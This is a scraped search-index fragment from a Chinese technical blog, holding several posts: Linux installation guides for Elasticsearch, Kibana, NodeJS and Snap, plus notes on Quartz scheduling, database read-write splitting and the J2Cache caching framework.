可用时进行升级。如果性能不太重要，或者只是不需要性能，例如 Kaggle、初创公司、原型开发或者学习深度学习，那么可以从廉价的 GTX 10 系列中受益，如果选择 GTX 10 系列要注意 GPU 的显存大小是否满足实际使用的要求。 深度学习常用工具 gpu driver：显卡驱动 cuda：GPU 上的并行计算平台和模型 pytorch：一个基于 Python 语言的深度学习框架 cudnn：相比标准的 cuda，它在一些常用的神经网络操作上进行了性能的优化 anaconda：一个开源的 Python 发行版本，其包含了 conda、python 等 180 多个科学包及其依赖项 tensorflow：一个基于数据流编程的符号数学系统，被广泛应用于各类机器学习算法的编程实现 keras：一个基于 Python 的深度学习库，提供了高层神经网络 API，后端可以选择 Tensorflow、Theano 以及 CNTK 参考文章 如何选择深度学习的 GPU 研究深度学习的硬件配置 完全硬件指南：教你 DIY 一套自己的深度学习机器 GPU 对比，Titan XP/GTX 1080 Ti/GTX 1080 谁更有优势 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"ai"},{title:"Linux 安装 ElasticSearch（单机）",url:"/posts/3ffff1a5.html",text:'前言 本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版系统。 Oracle JDK11 安装 1234567891011121314151617181920212223242526272829303132# 下载# wget -O /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz https://download.oracle.com/otn/java/jdk/11.0.4+10/cf1bbcbf431a474eb9fc550051f4ee78/jdk-11.0.4_linux-x64_bin.tar.gz?AuthParam=1563538966_65e52109c4dec9c83ac76eed75b8af77# 解压# tar -xvf /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz# 删除下载文件# rm /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz# 创建java命令的软链接（会覆盖已安装的其他版本jdk）# ln -sf /usr/local/jdk-11.0.4/bin/java /usr/bin/java# ln -sf /usr/local/jdk-11.0.4/bin/javac /usr/bin/javac# 配置环境变量# vim /etc/profileJAVA_HOME=/usr/local/jdk-11.0.4JRE_HOME=/usr/local/jdk-11.0.4/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效，如果不生效建议重启系统# javac -versionjavac 11.0.4# java -versionjava version "11.0.4" 2019-07-16 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.4+10-LTS)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.4+10-LTS, mixed mode) ElasticSearch 安装 ElasticSearch 官方下载地址 123456789101112131415161718192021222324252627282930313233343536# 进入安装目录# cd /usr/local# 下载ES# wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz# 解压ES# tar -xvf https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz# 删除下载文件# rm -f elasticsearch-7.2.0-linux-x86_64.tar.gz# 创建ES用户组和用户，出于系统安全考虑，ElasticSearch不允许直接使用Root权限来启动# groupadd elasticsearch# useradd elasticsearch -g elasticsearch -p yourpassword# 更改ES文件的所属用户组及用户# chown -R elasticsearch:elasticsearch elasticsearch-7.2.0# 切换ES用户# su elasticsearch# 前台启动ES$ cd elasticsearch-7.2.0/bin$ ./elasticsearch# 或者后台启动ES$ cd elasticsearch-7.2.0/bin$ ./elasticsearch -d# 测试连接ES，当结果输出JSON数据则说明ES启动成功# curl -XGET "127.0.0.1:9200"# 关闭后台运行的ES# ps -aux|grep elasticsearch# kill -9 pid ElasticSearch 配置 JVM 内存 123# 直接编辑ES的启动脚本# vim elasticsearch-7.2.0/bin/elasticsearchES_JAVA_OPTS="-Xms512m -Xmx512m" ElasticSearch 配置端口、远程访问 12345678910111213141516171819202122# 配置端口（默认端口为9200）# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlhttp.port: 9200# 配置远程访问# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlnode.name: node-1cluster.initial_master_nodes: ["node-1"] # 即node.name配置的值network.host: 192.168.25.131 # 当前ES的IP，或者network.host: 0.0.0.0# 切换ES用户# su elasticsearch# 后台启动ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# 防火墙开放ES的端口9200# firewall-cmd --zone=public --permanent --add-port=9200/tcp# firewall-cmd --reload# 浏览器测试远程访问，输入URL地址：192.168.25.131:9200，当输出JSON数据则说明远程访问配置成功 ElasticSearch 安装 Head 插件 Head 是 Elasticsearch 的集群管理插件，可以用于数据的浏览和查询。Elasticsearch5.0 之后，elasticsearch-head 不再做为插件放在其 plugins 目录下了，要使用它则必须先安装 Git，然后通过 Git 获取 Github 上的 elasticsearch-head 源码。运行 elasticsearch-head 需要用到 Grunt，而 Grunt 需要依赖 NPM 包管理器，因此 NodeJS 是必须要安装的，NodeJS 的安装可参考本站教程。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 进入安装目录# cd /usr/local# 安装git、bzip2# yum install -y git bzip2 # Centos# apt-get install -y git bzip2 # Debian、Ubuntu# 下载源码# git clone https://github.com/mobz/elasticsearch-head.git# 更改文件的所属用户组及用户# chown -R elasticsearch:elasticsearch elasticsearch-head# 全局安装Grunt# npm install -g grunt-cli# 安装elasticsearch-head的依赖包# cd elasticsearch-head# npm install# 提示：如果npm的安装过程比较慢，可以使用cnpm替代npm来安装依赖包# 配置elasticsearch-head允许所有IP访问# vim /usr/local/elasticsearch-head/Gruntfile.js# 在connect--&gt;server--&gt;options下面添加：hostname: \'*\'# 修改elasticsearch-head的默认连接地址# vim /usr/local/elasticsearch-head/_site/app.js# 将this.base_uri = this.config.base_uri || this.prefs.get("app-base_uri") || "http://localhost:9200"中的localhost修改为ES的服务器IP地址# 配置ES允许跨域访问，在ES的配置文件末尾追加下面两行内容即可# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlhttp.cors.enabled: truehttp.cors.allow-origin: "*"# 防火墙开放elasticsearch-head的端口9100# firewall-cmd --zone=public --permanent --add-port=9100/tcp# firewall-cmd --reload# 切换ES用户# su elasticsearch# 后台启动ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# 前台启动elasticsearch-head$ cd /usr/local/elasticsearch-head/node_modules/grunt/bin$ grunt server# 或者后台启动elasticsearch-head$ cd /usr/local/elasticsearch-head/node_modules/grunt/bin$ nohup grunt server &gt; es-head.log 2&gt;&amp;1 &amp;# 测试访问elasticsearch-head，浏览器输入网址：http://192.168.25.131:9100 ElasticSearch 安装 Kibana 插件 Kibana 是一个针对 Elasticsearch 的开源分析及可视化平台，使用 Kibana 可以查询、查看并与存储在 ES 索引的数据进行交互操作，也可以执行高级的数据分析，并能以图表、表格和地图的形式查看数据。 12345678910111213141516171819202122232425262728293031323334353637383940# 进入安装目录# cd /usr/local# 下载kibana# wget https://artifacts.elastic.co/downloads/kibana/kibana-7.2.0-linux-x86_64.tar.gz# 解压kibana# tar -xvf kibana-7.2.0-linux-x86_64.tar.gz# mv kibana-7.2.0-linux-x86_64 kibana-7.2.0# 删除下载文件# rm -f kibana-7.2.0-linux-x86_64.tar.gz# 更改文件的所属用户组及用户# chown -R elasticsearch:elasticsearch kibana-7.2.0# 修改ES服务的IP# vim kibana-7.2.0/config/kibana.yml# 将server.host、elasticsearch.hosts修改为ES的服务器IP地址，不能使用localhost或者127.0.0.1# 防火墙开放kibana的端口5601# firewall-cmd --zone=public --permanent --add-port=5601/tcp# firewall-cmd --reload# 切换ES用户# su elasticsearch# 后台启动ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# 前台启动kibana$ cd /usr/local/kibana-7.2.0/bin$ ./kibana# 或者后台启动kibana$ cd /usr/local/kibana-7.2.0/bin$ nohup ./kibana &gt; kibana.log 2&gt;&amp;1 &amp;# 测试访问kibana，浏览器输入网址：http://192.168.25.131:5601 ElasticSearch 常见错误解决方案 1234567891011# 错误：max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]# 永久修改# vim /etc/sysctl.confvm.max_map_count=262144# 使修改生效# /sbin/sysctl -p# 查看修改结果# sysctl vm.max_map_count 1234567891011# 错误：max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536]# 查看限制# ulimit -Hn# 针对elasticsearch用户，修改最大文件描述符数# vim /etc/security/limits.confelasticsearch hard nproc 4096elasticsearch soft nproc 4096elasticsearch hard nofile 1048576elasticsearch soft nofile 1048576 123456# 错误：the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured# 指定ES节点名称、Master节点# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlnode.name: node-1 # ES节点名称cluster.initial_master_nodes: ["node-1"] # ES的主节点，即node-name配置的值 123# 错误：ERROR: bootstrap checks failed memory locking requested for elasticsearch process but memory is not locked# 解决方案可参考：https://www.cnblogs.com/hellxz/p/11009634.html var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Linux 安装 NodeJS",url:"/posts/fe4ed47c.html",text:'前言 Linux 环境下安装 NodeJS，可以选择手动编译安装或者直接使用编译好的二进制包来安装。如果是手动编译安装，需要安装对应版本的 gc++、python。本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版系统。 NodeJS 编译安装 1234567891011121314151617181920212223242526# 软件依赖g++4.8.2python2.6 或者 python2.7# 下载源码压缩包# wget https://nodejs.org/dist/v10.16.0/node-v10.16.0.tar.gz# 解压源码压缩包$ tar -xvf node-v10.16.0.tar.gz# 编译安装# cd node-v10.16.0# ./configure --prefix=/usr/local/node-10.16.0# make -j4# make install# 配置环境变量# vim /etc/profileexport PATH=${PATH}:/usr/local/node-10.16.0/bin# 使环境变量生效# source /etc/profile# 查看Node、NPM的版本# npm -v# node -v NodeJS 二进制包安装 1234567891011121314151617181920# 进入安装目录# cd /usr/local# 下载已经编译好的二进制包# wget https://nodejs.org/dist/v10.16.0/node-v10.16.0-linux-x64.tar.xz# 解压二进制包# tar -xvf node-v10.16.0-linux-x64.tar.xz# mv node-v10.16.0-linux-x64 node-10.16.0# 配置环境变量# vim /etc/profileexport PATH=${PATH}:/usr/local/node-10.16.0/bin# 使环境变量生效# source /etc/profile# 查看Node、NPM的版本# npm -v# node -v 验证 NodeJs 是否安装成功 第一步：新建 JS 文件 web-server.js，代码内容如下： 12345678var http = require(\'http\');http.createServer(function (req, res) { res.writeHead(200, {\'Content-Type\': \'text/plain\'}); res.end(\'Hello World\\n\');}).listen(8888, \'127.0.0.1\');console.log(\'Server running at http://127.0.0.1:8888/\'); 第二步：运行 JS 脚本，然后浏览器测试访问 URL：http://127.0.0.1:8888 ，如果 NodeJS 安装成功，浏览器会输出信息：Hello World 1# node web-server.js 使用 CNPM 替代 NPM 12# 全局安装CNPM# npm install -g cnpm --registry=https://registry.npm.taobao.org var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Quartz 之一开发随记",url:"/posts/e3b4a6cc.html",text:'控制 Quartz 只执行一次 纯 API 调用的代码 1234567891011121314public class ScheduleTest { private static final String JOB_NAME = "job"; private static final String JOB_GROUP = "jobGroup"; public void runOnceTime() throws Exception { Scheduler scheduler = schedulerFactory.getScheduler(); JobDetail jobDetail = JobBuilder.newJob(ScheduleJob.class).withIdentity(JOB_NAME, JOB_GROUP).build(); SimpleScheduleBuilder scheduleBuilder = SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(0).withRepeatCount(0); Trigger trigger = TriggerBuilder.newTrigger().withIdentity(JOB_NAME, JOB_GROUP).withSchedule(scheduleBuilder).build(); scheduler.scheduleJob(jobDetail, trigger); scheduler.start(); }} Spring 的 XML 配置 1234567&lt;!-- 配置Spring项目启动后任务就执行一次 --&gt;&lt;bean id="rsh_simpleTrigger1" class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myJobDetail" /&gt; &lt;property name="startDelay" value="500" /&gt; &lt;property name="repeatInterval" value="0" /&gt; &lt;property name="repeatCount" value="0" /&gt;&lt;/bean&gt; Quartz 控制线程级别的暂停、恢复、停止 Quartz 提供了暂停调度（pauseTrigger、pauseJob）、恢复调度（resumeTrigger、resumeJob）、删除调度（deleteJob）等 API，但本质都是控制 Trigger 的触发，而非直接控制任务线程的运行。如果要进行线程级别的停止，可以调用 scheduler.interrupt() 方法来实现，此时 Job 类需要实现 InterruptableJob 接口。 Quartz 的 Misfire 策略 Quartz 中有一种 Job 接口是 StatefulJob（有状态任务），简单来说这种 Job 使用在不能并发执行的场景下。比如定义了某个任务，每分钟执行一次，对一些数据进行增删操作，正常执行时，每分钟执行的 Job 互不影响；但某个时刻出现了意外，某个任务执行了三分钟，那么当在这个任务持续执行的过程中，不希望并发执行另外两次定时任务的，这就需要使用有状态任务，而没有执行的两次定时任务就是 Misfired Job。还有一种使用场景就是当执行暂停调度（pauseTrigger、pauseJob），然后执行恢复调度 (resumeTrigger、resumeJob)，Quartz 会默认在恢复的时候把暂停期间没执行的任务弥补执行。对于判定是否为 Misfired Job，其实有很多条件，目前了解到的有： 调度暂停执行期间，预定的任务未执行 到执行时间时，上一个任务还未完成 过期时间已超过设置的 misfireThreshold 参数值 线程池中已没有空闲线程 线程池中虽有空闲线程，但有优先级更高的任务 产生 Misfire 后，Quartz 会根据 Misfire 策略进行任务的处理，其中 Trigger、CronTrigger、SimpleTrigger 的 Misfire 策略如下： MISFIRE_INSTRUCTION_SMART_POLICY，默认的策略 MISFIRE_INSTRUCTION_FIRE_ONCE_NOW，立即触发一次，触发后恢复正常的频率 MISFIRE_INSTRUCTION_DO_NOTHING，什么都不做，继续等下一次预定时间再触发 在 Spring 的 XML 配置中，Misfire 策略可以在 CronTriggerBean 中配置，同时需要在 quartz.properties 配置文件中指定 misfireThreshold 参数的值（单位为毫秒）。其中 misfireThreshold 表示实际执行时间与下一次应该执行时间之间的差值，超过这个差值就不会执行，低于这个差值就会执行。例如任务每 3 秒执行一次，配置 misfireThreshold=6000，当暂停低于 6 秒内，Quartz 会弥补执行，超过 6 秒就不再弥补执行。具体的配置如下： 12345&lt;bean id="cronTrigger" class="org.springframework.scheduling.quartz.CronTriggerBean"&gt; &lt;property name="jobDetail" ref="buildTask" /&gt; &lt;property name="cronExpression" value="0 30 16 ? * 6" /&gt; &lt;property name="misfireInstruction" value="2"&gt;&lt;/property&gt;&lt;/bean&gt; 1org.quartz.jobStore.misfireThreshold = 6000 Quartz Cron 表达式在线生成工具 CronMaker Cron Expression Generator Quartz 参考资料 基于 Quartz 开发企业级任务调度应用 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"Centos7 下 Snap 的安装与使用",url:"/posts/ba754e9a.html",text:'Snap 介绍 Snap 是 Ubuntu 母公司 Canonical 于 2016 年 4 月发布 Ubuntu-16.04 时引入的一种全新的、安全的、易于管理的、沙盒化的软件包管理方式，与传统的 dpkg/apt 有着很大的区别，背后主要的动机是解决 Linux 平台的碎片化问题。Snap 的安装包扩展名是 .snap，类似于一个容器，它包含一个应用程序需要用到的所有文件和库（Snap 包里包含一个私有的 root 文件系统，里面包含了依赖的软件包）。不管底层系统如何，Snap 都可轻松安装、升级、降级和移除应用，因此 Snap 的应用程序很容易安装在任何基于 Linux 的系统上，而且支持用户在同一个系统中安装同一应用程序的多个版本。使用 Snap 包的好处就是它解决了应用程序之间的依赖问题，使应用程序之间更容易管理，但是由此带来的问题就是占用更多的磁盘空间。类似的应用程序容器技术还有大名鼎鼎的 Flatpak、AppImage。Snap 适用于 CentOS 7.6+ 和 Red Hat Enterprise Linux 7.6+，它很好地弥补了 Centos 桌面软件资源不多的缺点，可以从 Extra Packages for Enterprise Linux（EPEL）存储库安装。Snap 的工作原理如下图所示： Snap 安装 12345678910111213141516171819202122232425262728293031323334353637383940414243# 安装EPEL源# yum install epel-release# 添加copr仓库（可选）# yum install yum-plugin-copr# yum copr enable ngompa/snapcore-el7# 安装Snap# yum install snapd# 安装Snap的其他组件（可选）# yum install snapd-glib snapd-qt snapd-qt-qmlg# 启用通信套接字# systemctl enable --now snapd.socket# 创建软链接# ln -s /var/lib/snapd/snap /snap# 注销并重新登录，或者重新启动系统# reboot# 查看Snap的运行状态# systemctl status snapd# 如果Snap处于关闭状态，则手动启动它# systemctl start snapd# 添加环境变量# vim /etc/profileexport PATH=$PATH:/snap/bin# 使环境变量生效# source /etc/profile# 验证是否运行正常# snap install hello# 如果运行正常，执行hello会输出"Hello, world!"# hello# 或者安装andy-testsnap-py测试工具# snap install andy-testsnap-py --edge Snap 常用命令 1234567891011121314151617181920212223242526272829303132333435363738# 列出所有已安装的应用# snap list# 查找应用# snap find hello# 查询应用的详细信息# snap info hello# 安装应用# snap install hello# 指定仓库安装应用（可选仓库：edge、beta、candidate、stable）# snap install hello --channel=stable# 运行应用（或者直接执行：hello）# snap run hello# 卸载应用（包括所有版本）# snap remove hello# 卸载特定版本的应用# snap remove hello --revision 352# 更新所有应用# snap refresh all# 更新特定的应用# snap refresh hello# 回滚特定应用到上一个版本# snap revert hello# 查看任务执行的历史记录# snap changes# 终止正在执行的特定任务# snap abort task-id (adsbygoogle = window.adsbygoogle || []).push({}); Snap-Store 安装 Snapcraft 应用商店提供了所有 Snap 应用程序，同时 Snap 官方提供了商店应用 Snap-Store，支持在本地使用图形界面的方式管理 Snap 应用程序，包括安装、卸载、搜索 Snap 应用程序等。点击查看 Snap-Store 的实际运行效果图。 12345678910111213141516171819202122232425# 安装# snap install snap-store# 创建快捷方式# vim /usr/share/applications/snap-store.desktop[Desktop Entry]Name[zh_CN]=Snap 商店Name=Snap StoreComment[zh_CN]=添加、移除或更新计算机软件Comment=Add, remove or update software on this computerIcon=/snap/snap/snap-store/current/meta/gui/io.snapcraft.Store.pngExec=/snap/bin/snap-store %UTerminal=falseType=ApplicationCategories=GNOME;GTK;System;PackageManager;Keywords=Updates;Upgrade;Sources;Repositories;Preferences;Install;Uninstall;Program;Software;App;Store;Snap;StartupNotify=trueMimeType=x-scheme-handler/appstream;x-scheme-handler/snap;X-GNOME-UsesNotifications=trueDBusActivatable=false# 导航到：应用程序 --&gt; 系统工具 --&gt; Snap 商店，直接点击快捷方式启动应用即可# 或者直接执行命令（使用普通用户权限）$ /snap/bin/snap-store Snap 相关目录介绍 1231. 通过snap安装应用程序后，其应用程序的安装文件所在目录为：/var/lib/snapd/snap2. 普通用户的snap应用文件所在目录：~/snap3. snapd的安装目录：/var/lib/snapd Snap 更改默认安装目录 Snap 安装使用后比较占用磁盘空间（默认安装目录为 /var/lib/snapd），如果希望 Snap 安装在特定的目录，此时不能使用创建软链接的方法（ln -s）来关联到新的安装目录，否则 Snap 的应用将无法正常启动。正确的做法是使用 mount --bind 命令将新的安装目录挂载到 /var/lib/snapd 目录，具体可参考以下教程或者 Shell 脚本（建议执行 Shell 脚本之前先关闭 snapd 服务和卸载 snapd 的 /dev/loopxx 设备）。提示，/var/snap 目录千万不要移动，该目录一般情况下不需要做任何处理。 Move snap packages to another location/directory Where is a snap stored and how can I change that? 123456789101112131415161718192021222324252627282930313233343536373839404142434445############################################################################### Take Care this section may break the System !!!############################################################################### Move snap folder to Home instead of root# Create the directory, you can change the locationmkdir /home/$USER/snap/snapd# Copy the datasudo rsync -avzP /var/lib/snapd/ /home/$USER/snap/snapd/# Do backupssudo cp /etc/fstab /etc/fstab.baksudo mv /var/lib/snapd /var/lib/snapd.bak# Change fstab (Change $USER with your name or change the path totally)sudo echo "/home/$USER/snap/snapd /var/lib/snapd none bind 0 0" | sudo tee -a /etc/fstab# remount fstab or reboot.sudo mkdir /var/lib/snapdsudo mount -aif ls /var/lib/snapd/ | grep snapsthen echo "Re-mounting snapd folder is done successfully !!!!" sudo rm -rf /etc/fstab.bak sudo rm -rf /var/lib/snapd.bakelse echo "WARNING : Re-mounting snapd folder failed, please revert !!!!" # trying to revert automatically sudo cp /etc/fstab.bak /etc/fstab sudo mount -a sudo umount /var/lib/snapd sudo mv /var/lib/snapd.bak /var/lib/snapd echo "Revert automatically is done successfully !!!!"fi############################################################################### Take Care the pervious section may break the System !!!############################################################################## Snap 输出调试信息 12345678910111213# 编辑Snap服务的配置文件，添加以下内容（环境变量）# systemctl edit snapd.service[Service]Environment=SNAPD_DEBUG=1 SNAPD_DEBUG_HTTP=7# 使配置文件生效# systemctl daemon-reload# 重启服务# systemctl restart snapd.service# 打印Snap服务的日志信息# journalctl -xeu snapd 解决 Snap 下载网速慢的问题 123456789101112131415161718# 方法一（使用代理）# 编辑Snap服务的配置文件，添加以下内容（环境变量）# systemctl edit snapd.service[Service]Environment=http_proxy=127.0.0.1:1080Environment=https_proxy=127.0.0.1:1080# 使配置文件生效# systemctl daemon-reload# 重启服务# systemctl restart snapd.service# 方法二（离线安装）# 打开浏览器前往 https://uappexplorer.com/snaps 搜索并下载需要的snap包# 执行本地安装命令：snap install xxx.snap --dangerous 解决 Snap 应用程序无法卸载的问题 1234567891011# 举例说明：假如应用程序core无法卸载，可先取消挂载对应的/dev/loopxx设备，然后再执行卸载操作# 查看snap设备的挂载情况# df -h | grep snap/dev/loop1 90M 90M 0 100% /usr/var/lib/snapd/snap/core/7713# 取消设备挂载# umount /dev/loop1# 卸载应用# snap remove core Snapcraft 打包构建 Snap 应用程序 Snapcraft 可以用来构建 Snap 的应用程序，使用也非常的简单，仅仅需要写一个 snapcraft.yaml 的配置文件即可，作用类似 Docker 的 docker-file，具体的打包教程可参考这里。 参考博客 Linux 安装模式 AppImage,Flatpak,Snap 整理 Ubuntu 18.04 及 Snap 体验 — 让 Linux 入门更简单 真有用？Snap 和 Flatpak 通吃所有发行版的打包方式 三款新星 Linux 解决方案：Snappy、Flatpak 和 AppImage var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"数据库读写分离（动态数据源切换）介绍",url:"/posts/a6aa7529.html",text:'数据库读写分离方案介绍读写分离要做的事情就是决定一条 SQL 该到哪个数据库去执行，至于谁来做决定数据库这件事，要么数据库中间件去做，要么应用程序自己去做。首先针对应用程序自己去做的场景，读写分离的职责应该属于数据访问层而不是业务层，其次读写分离不应该入侵到代码中。因此在 Service—DAO—ORM— 数据库驱动的调用链中，要想做到代码弱入侵性或者零入侵性，只能将读写分离写在 ORM 层或者数据库驱动层，写在 ORM 层就和具体 ORM 框架耦合，写在数据库驱动层，就和具体数据库耦合。至于在 ORM 层还是在数据库驱动层实现读写分离，主要看更换 ORM 框架和数据库哪个成本更高和实现的难易程度。一般来讲，读写分离（动态数据源切换）的核心方案主要有以下几种： 第一种构建多套环境，优势是方便控制也容易集成一些简单的分布式事务，缺点是非动态同时代码量较多，配置难度大； 第二种是依靠数据库中间件（例如：MyCat），由中间件做读写分离，优势是对整个应用程序都是透明的，缺点是降低性能，不支持多数据源事务； 第三种是应用程序自己去做，例如使用支持读写分离的数据库驱动、使用 Spring 原生提供的 AbstractRoutingDataSource。后者需要控制只读事务和读写事务切换到主库，写操作切换到主库，读操作切换到从库；同时保证单个事务里面所有的 SQL 都是在同一个数据源里执行。缺点是多数据源的配置不灵活，不支持多数据源事务。具体实现方式可参考 基于 Service 层的 Spring 路由数据源 + AOP / Annotation、基于 ORM 层的 Spring 路由数据源 + Mybatis 插件 / Annotation。 最佳实践Dynamic-DatasourceDynamic-Datasource 是 MyBatis-Plus 官方的读写分离框架。如果数据源较少，场景不复杂，不需要使用多数据源事务，可以选择上述任意一种读写分离方案。如果需要更多特性，又不想引入数据库中间件，可尝试 Dynamic-Datasource，具体的使用方式建议阅读 官方文档一、官方文档二、开源中国介绍。 优势： 项目启动后支持动态增减数据源 简化 Druid 和 HikariCp 配置，提供全局参数配置 提供自定义数据源来源（默认使用 yml 或 properties 配置） 数据源分组，适用于多种场景，包括纯粹多库、读写分离、一主多从、多主多从、混合模式 使用 Spel 动态参数解析数据源，如从 session，header 和参数中获取数据源。（多租户架构神器） 简单集成 Druid 数据源监控多数据源，简单集成 Mybatis-Plus 简化单表，简单集成 P6sy 格式化 SQL，简单集成 Jndi 数据源 使用正则匹配或 Spel 表达式来切换数据源（实验性功能） 默认支持通过 @DS 注解来动态选择数据源（代码入侵性强），额外支持使用 MyBatis 插件在 ORM 层实现纯读写分离（代码零入侵性），但两者不能同时使用 使用 @DS 注解的时候，支持多层数据源嵌套切换。（一个业务 ServiceA 调用 ServiceB，ServiceB 调用 ServiceC，每个 Service 都是不同的数据源） 劣势 不支持多数据源事务（同一个数据源下支持事务），网上绝大多数普通方案（基于 Spring 路由数据源 ）也都不能支持 如果需要使用到分布式事务，那么架构应该到了微服务化的时候 提示：如果项目中只有几个数据库，但是有强烈使用分布式事务的需求，建议还是使用传统方式自己构建多套环境集成 Atomic 这类方案 约定 只做切换数据源这件核心的事情，并不限制具体操作，切换了数据源可以做任何 CRUD 操作 配置文件中所有以下划线 _ 分割的数据源，首部即为组的名称，相同组名称的数据源会放在一个组下 切换数据源即可以是组名，也可以是具体数据源名称，切换时默认采用负载均衡机制切换 默认的数据源名称为 master，可以通过 spring.datasource.dynamic.primary 修改 方法上的注解优先于类上注解 Sharding-JdbcSharding-Jdbc 是 Apache 的分布式数据库中间件。 参考文献 基于 MyBatis 的读写分离插件 读写分离 Spring + Mybatis 解决方案 其他开源项目 spring-boot-mybatis-rw spring-boot-mybatis-rw docs var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 数据库"},{title:"J2Cache - 两级缓存框架介绍",url:"/posts/c8f728b3.html",text:'相关站点 J2Cache Gitee J2Cache Java Docs J2Cache 官方视频介绍 J2Cache 官方 PDF 介绍 J2Cache 的简单测试 主流缓存框架 Ehcache、Caffeine 、Spring Cache、Guava Cache、JetCache 主流缓存解决方案 内存缓存（如 Ehcache、Caffeine） — 速度快，进程内可用 集中式缓存（如 Redis、Memcached）— 可同时为多节点提供服务 常见的缓存清除策略 Ehcache 自动清除 程序清除 手工清除 Ehcache 的优缺点 优点： 读写内存，速度快 两级缓存（内存 + 磁盘） 多区域 (Region) 的缓存数据结构 暴露了缓存数据监听接口 支持多种集群部署方式 (JGroups、RMI、Ehcache Server) 缺点： 高峰期重启导致的缓存雪崩 单节点对突发的攻击应付不足 多节点运行时缓存数据不同步 J2Cache 真正解决的问题 使用内存缓存时，一旦应用重启后，由于缓存数据丢失，缓存雪崩，给数据库造成巨大压力，导致应用堵塞 使用内存缓存时，多个应用节点无法共享缓存数据 使用集中式缓存，由于大量的数据通过缓存获取，导致缓存服务的数据吞吐量太大，带宽跑满。现象就是 Redis 服务负载不高，但是由于机器网卡带宽跑满，导致数据读取非常慢 提示：J2Cache 不适合对数据一致性要求很高的业务场景。 J2Cache 的设计思路 在 